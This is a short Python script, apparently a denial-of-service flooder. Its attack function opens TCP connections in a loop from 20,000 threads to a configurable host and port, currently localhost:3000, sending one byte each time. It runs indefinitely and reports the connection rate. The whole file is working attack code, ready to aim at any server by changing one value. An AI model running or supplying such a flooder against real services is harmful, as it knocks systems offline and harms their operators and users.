import socket, threading, time, sys

HOST = "localhost"
PORT = 3000
THREADS = 20000
DURATION = 0

running = True
count = 0

def attack():
    global count
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((HOST, PORT))
            s.sendall(b"H")
            s.close()
            count += 1
        except Exception:
            pass

for _ in range(THREADS):
    threading.Thread(target=attack, daemon=True).start()

start = time.time()
try:
    while DURATION == 0 or time.time() - start < DURATION:
        time.sleep(1)
        sys.stdout.write(f"\r{count} connections sent ({count/(time.time()-start):.0f}/s)")
        sys.stdout.flush()
except KeyboardInterrupt:
    pass
finally:
    running = False
    print(f"\nDone. {count} connections sent to {HOST}:{PORT}")
